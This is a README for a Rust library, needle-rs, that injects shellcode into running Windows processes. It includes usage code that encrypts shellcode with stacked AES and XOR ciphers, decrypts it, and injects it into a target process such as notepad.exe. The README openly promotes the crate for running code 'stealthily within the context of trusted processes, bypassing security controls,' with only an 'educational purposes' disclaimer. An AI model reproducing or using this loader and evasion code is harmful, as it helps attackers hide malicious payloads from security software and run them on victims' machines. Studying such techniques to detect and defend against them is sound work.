# Rust Process Injection (Windows Only)
[Documentation](https://swiiz.github.io/needle-rs/needle/index.html) - [Apache 2.0 License](https://github.com/Swiiz/needle-rs/blob/main/LICENSE) - [Author](https://github.com/Swiiz)

> Process injection is a technique used to execute arbitrary code in the address space of a separate live process. It is commonly used in both legitimate applications, such as debugging tools, and malicious activities, such as malware attacks. The main goal of process injection is to manipulate the target process to run the injected code with the same permissions and context as the original process, often to evade detection and security measures.

Allows for running "malicious" code stealthily within the context of trusted processes, bypassing security controls. 

## Features:
- Process Injection using Windows API
- Multiple encryption algorithms with the ability to stack
- Easy to use

## How to use:
- Add the following to your `Cargo.toml`

```TOML
[dependencies]
needle = { git = "https://github.com/Swiiz/needle-rs.git", features = [ "windows" ] }
```

- (**Optional**) Encrypt your shellcode using a cypher like the following:

```RUST
fn generate_payload(shellcode: Shellcode) {
    let payload = shellcode
        .into_raw()
        .aes_encrypt(&AES_KEY)
        .xor_encrypt(XOR_KEY);
    println!("Encrypted shellcode: {:#04x?}", payload);
}
```

- (**Optional**) Decrypt your payload into shellcode
- Inject the shellcode into the target process:

```RUST
const SHELL_CODE: &[u8] = include_bytes!("YOUR_PAYLOAD.bin");
const XOR_KEY: u8 = 0x42;
const AES_KEY: [u8; 32] = [ /* ... */ ];

fn main() {
    let payload = XorCypher::<AesCypher>::from(SHELL_CODE.to_vec())
        .decrypt(&XOR_KEY) // You usually don't need to stack cyphers but it works
        .decrypt(&AES_KEY);

    let process = find_process("notepad.exe").expect("Target process not found");
    if let Err(e) = inject(process, payload) {
        println!("Could not inject payload: {}", e);
    }
}
```

## Examples
- [Simple](examples/simple.rs)
- [Xor](examples/xor.rs)
- [Aes](examples/aes.rs)
- [Mixed](examples/mixed.rs)

## Contributing
If anyone is interested in implementing other platforms/methods/cyphers, please feel free to contribute 👍

## Disclaimer
Information and code provided on this repository are for educational purposes only. The creator is in no way responsible for any direct or indirect damage caused due to the misuse of the information.